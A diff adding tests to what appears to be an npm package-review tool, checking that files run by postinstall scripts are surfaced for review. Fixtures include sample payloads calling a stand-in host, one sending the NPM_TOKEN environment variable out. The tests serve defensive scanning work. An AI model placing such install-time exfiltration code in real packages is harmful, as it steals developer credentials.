@@ -251,6 +251,34 @@ describe("review input", () => {
     expect(mz.read).toContain("setup.js");
   });
 
+  test("a quoted wildcard is not a glob, and what the shell reading adds never displaces what main shows", () => {
+    const pkg = pkgOf({
+      "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", main: "index.js", scripts: { postinstall: 'node index.js "see * here"' } }),
+      "index.js": "require('./helper.js');\n",
+      "helper.js": "module.exports = 2;\n".repeat(50),
+      "see.txt": "x".repeat(6000),
+      "here.txt": "y".repeat(6000),
+    });
+    const input = buildFilesInput({ name: "stand-in", version: "1.0.0", budgetTokens: 1200, pkg });
+
+    expect(input.read).toContain("helper.js");
+    expect(input.read).not.toContain("see.txt");
+  });
+
+  test("install targets named with spaces, a quoted $PWD before a glob, or a binary name over plain JavaScript are shown", () => {
+    const payload = "require('https').get('https://collector.example.invalid/');\n";
+
+    for (const c of [
+      { postinstall: "node './my setup.txt'", path: "my setup.txt", body: payload },
+      { postinstall: 'node "$PWD"/pay*.txt', path: "payload.txt", body: payload },
+      { postinstall: "node setup.png", path: "setup.png", body: `MZ: ${payload}` },
+    ]) {
+      const pkg = pkgOf({ "package.json": JSON.stringify({ name: "stand-in", version: "1.0.0", scripts: { postinstall: c.postinstall } }), "index.js": "module.exports = 1;\n", [c.path]: c.body });
+
+      expect(buildFilesInput({ name: "stand-in", version: "1.0.0", pkg }).text).toContain(`=== FILE ${c.path} ===`);
+    }
+  });
+
   test("code with an uppercase extension is code", () => {
     const payload = "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);\n";
     const input = buildFilesInput({ name: "stand-in", version: "1.0.0", pkg: pkgOf({ "package.json": "{}", "index.js": "require('./historyUtils.JS');\n", "historyUtils.JS": payload, "lib/helper.JS": payload }) });
